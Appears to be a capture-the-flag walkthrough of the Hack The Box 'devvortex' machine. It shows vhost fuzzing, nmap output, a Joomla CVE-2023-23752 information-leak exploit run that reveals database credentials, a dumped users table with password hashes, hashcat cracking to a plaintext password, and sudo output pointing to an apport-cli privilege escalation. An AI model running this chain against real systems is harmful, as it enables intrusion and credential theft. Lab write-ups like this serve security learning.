# nmap scanning

`nmapinit devvortex.htb`

# vhost scanning

```
$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://devvortex.htb -H "Host:FUZZ.devvortex.htb" -c -mc 200    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 317ms]
    * FUZZ: dev

:: Progress: [20469/20469] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```

# nmap init

```
$ nmapinit dev.devvortex.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 10:47 MDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating SYN Stealth Scan at 10:47
Scanning dev.devvortex.htb (10.129.87.188) [1000 ports]
Discovered open port 80/tcp on 10.129.87.188
Discovered open port 22/tcp on 10.129.87.188
Completed SYN Stealth Scan at 10:47, 0.89s elapsed (1000 total ports)
Initiating Service scan at 10:47
Scanning 2 services on dev.devvortex.htb (10.129.87.188)
Completed Service scan at 10:47, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.87.188.
Initiating NSE at 10:47
Completed NSE at 10:47, 3.44s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.24s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Nmap scan report for dev.devvortex.htb (10.129.87.188)
Host is up (0.055s latency).
rDNS record for 10.129.87.188: devvortex.htb
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Devvortex
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)

```

# Auth bypass

https://github.com/ThatNotEasy/CVE-2023-23752

```

█████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════
╔════════════╩═════════════════════════════════╩═════════════════════════════╗
║ • AUTHOR                 |   PARI MALAM                                    ║
║ • GITHUB                 |   GITHUB.COM/PARI-MALAM                         ║
╔════════════════════════════════════════════════════════════════════════════╝
║ • OFFICIAL FORUM         |   DRAGONFORCE.IO                                ║
║ • OFFICIAL TELEGRAM      |   @DRAGONFORCE.IO                               ║
╚════════════════════════════════════════════════════════════════════════════╝
[CVE-2023-23752] - Authentication Bypass Information Leak on Joomla!

[1] - Single Scan
[2] - Massive Scan

[CVE-2023-23752]: 1

IP/Domain: dev.devvortex.htb

[CVE-2023-23752] - dev.devvortex.htb .: [Scanning!]

[+] Domain            : dev.devvortex.htb
[+] Database Type     : mysqli
[+] Database Prefix   : sd4fg_
[+] Database          : joomla
[+] Hostname          : localhost
[+] Username          : lewis
[+] Password          : P4ntherg0t1n5r3c0n##
```

# suid stuff

`find / -perm 4000 2>/dev/null`


# mysql db connected with db creds from above

mysql> SELECT * FROM sd4fg_users
SELECT * FROM sd4fg_users
    -> ;
;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-03-22 18:36:07 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

# Hashcat

`hashcat -m 3200 -a 0 ./hash /usr/share/wordlists/rockyou.txt`

tequieromucho

# sudo -l

```
$ sudo -l            sudo -l
sudo -l
[sudo] password for logan: tequieromucho


Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

# priv esc with apport-cli

https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00
